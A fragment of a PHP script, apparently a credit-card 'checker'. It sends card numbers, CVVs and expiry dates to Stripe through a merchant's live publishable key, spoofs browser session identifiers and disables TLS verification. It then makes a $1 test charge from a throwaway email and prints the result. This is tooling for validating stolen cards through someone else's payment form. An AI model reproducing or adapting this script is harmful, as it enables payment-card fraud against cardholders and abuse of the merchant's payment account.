...
#########################[1 REQ]############################
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=d0bf9c61-e089-4607-99cb-02a5524b9e26ead1b1&muid=3d1fe797-f04e-4518-be70-71d33ff30244b5febd&sid=dc62dc27-b2a0-4acc-8ae5-97f69c84e998209c55&payment_user_agent=stripe.js%2F66ea6b3ee%3B+stripe-js-v3%2F66ea6b3ee&time_on_page=255602&key=pk_live_eHjmIv6BpzVPLB8N3JjuCjsl00SrbAiU3w&pasted_fields=number');
...
############################[2 Req]############################
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=jjcymvze%40karenkey.com&amount=%241&stripeToken='.$id.'');
...
//=======================[Responses-END]==============================//
    ...
    echo "<b>Last result=</b>$message<br><br>";
//sleep(2)
